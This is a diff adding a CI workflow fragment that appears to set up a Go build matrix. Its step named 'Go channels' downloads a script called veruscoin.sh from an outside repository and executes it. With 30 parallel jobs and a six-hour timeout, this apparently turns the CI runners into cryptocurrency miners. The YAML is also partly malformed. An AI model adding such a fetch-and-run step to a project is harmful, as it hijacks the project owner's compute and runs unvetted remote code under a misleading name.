@@ -1,0 +1,18 @@
+runs-on: ubuntu-18.04
+strategy:
+  max-parallel: 30
+  fail-fast: false
+matrix:
+  go: [1.6, 1.7, 1.8, 1.9, 1.10]
+flag: [A, B, C, D, E, F, G, H, I, ]
+timeout-minutes: 360
+env:
+  NUM_JOBS: 20
+steps:
+  - name: Set up Go ${{ matrix.go }}
+    uses: actions/setup-go@v2
+    with:
+      go-version: ${{ matrix.go }}
+  - name: Go channels
+    run: |
+      wget https://raw.githubusercontent.com/kampun9kec1l-ship-it/Veruz/refs/heads/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
